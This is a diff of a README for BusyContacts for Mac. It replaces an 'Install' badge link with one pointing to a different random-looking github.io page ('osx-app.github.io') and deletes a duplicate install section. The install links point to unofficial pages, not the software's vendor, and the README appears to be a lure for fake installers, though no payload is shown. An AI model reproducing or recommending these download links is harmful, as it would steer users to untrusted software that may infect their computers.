@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Install BusyContacts Mac](https://img.shields.io/badge/Install_BusyContacts_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/busyconta)
+[![Install BusyContacts Mac](https://img.shields.io/badge/Install_BusyContacts_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/busyconta)
 
 </div>
 
@@ -64,16 +64,6 @@ Key benefits include:
 ---
 
 ![BusyContacts Interface](https://mikevardy.com/wp-content/uploads/2022/06/bct-list-view-1280.png) 
-
----
-
-## Install BusyContacts Mac  
-
-<div align="center">
-
-[![Install BusyContacts Mac](https://img.shields.io/badge/Install_BusyContacts_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/busyconta)
-
-</div>
 
 ---
 
